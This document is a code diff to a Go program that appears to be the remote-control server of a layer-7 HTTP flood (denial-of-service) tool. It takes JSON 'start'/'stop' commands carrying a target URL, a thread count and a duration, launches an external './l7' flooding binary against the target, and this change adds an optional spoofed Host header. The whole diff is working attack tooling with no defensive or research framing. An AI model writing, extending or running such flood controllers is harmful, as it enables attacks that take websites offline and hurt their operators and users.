@@ -11,11 +11,13 @@ import (
 	"time"
 )
 
+// Command defines the JSON payload structure
 type Command struct {
-	Action  string `json:"action"`  // "start" or "stop"
-	URL     string `json:"url"`     // Target URL
-	Threads int    `json:"threads"` // Number of threads
-	Timer   int    `json:"timer"`   // Duration in seconds
+	Action     string `json:"action"`      // "start" or "stop"
+	URL        string `json:"url"`         // Target URL
+	Threads    int    `json:"threads"`     // Number of threads
+	Timer      int    `json:"timer"`       // Duration in seconds
+	CustomHost string `json:"custom_host"` // Optional custom Host header
 }
 
 var (
@@ -24,7 +26,7 @@ var (
 	status         = "Ready"
 )
 
-func executeL7(url string, threads, timer int) {
+func executeL7(url string, threads, timer int, customHost string) {
 	// Lock to prevent multiple instances
 	mu.Lock()
 	defer mu.Unlock()
@@ -37,8 +39,13 @@ func executeL7(url string, threads, timer int) {
 
 	status = "Sending"
 
-	// Build the L7 command
-	cmd := exec.Command("./l7", url, fmt.Sprintf("%d", threads), fmt.Sprintf("%d", timer))
+	// Build the L7 command with optional customHost
+	args := []string{url, fmt.Sprintf("%d", threads), fmt.Sprintf("%d", timer)}
+	if customHost != "" {
+		args = append(args, customHost)
+	}
+
+	cmd := exec.Command("./l7", args...)
 
 	// Set up command output (optional)
 	cmd.Stdout = os.Stdout
@@ -80,7 +87,7 @@ func handleControl(w http.ResponseWriter, r *http.Request) {
 
 	// Handle the command
 	if cmd.Action == "start" {
-		go executeL7(cmd.URL, cmd.Threads, cmd.Timer)
+		go executeL7(cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)
 	} else if cmd.Action == "stop" {
 		mu.Lock()
 		if currentCommand != nil && currentCommand.Process != nil {
